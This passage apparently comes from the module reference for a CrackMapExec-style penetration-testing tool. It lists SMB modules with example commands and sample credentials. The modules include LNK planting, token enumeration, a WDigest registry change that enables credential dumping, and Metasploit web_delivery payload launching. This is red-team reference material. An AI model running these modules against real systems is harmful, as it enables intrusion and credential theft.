    NAME          LNK file name
    CLEANUP       Cleanup (choices: True or False)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M slinky
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## test_connection           
Executes the Test-Connection PowerShell cmdlet  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    HOST      Host to ping
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M test_connection
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## tokens                    
Enumerates available tokens using Powersploit's Invoke-TokenManipulation  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    USER      Search for the specified username in available tokens (default: None)
    USERFILE  File containing usernames to search for in available tokens (defult: None)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M tokens
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## uac                       
Checks UAC status  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M uac
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## wdigest                   
Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    ACTION  Create/Delete the registry key (choices: enable, disable)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M wdigest
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## web_delivery 
Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    URL  URL for the download cradle
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M web_delivery
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------

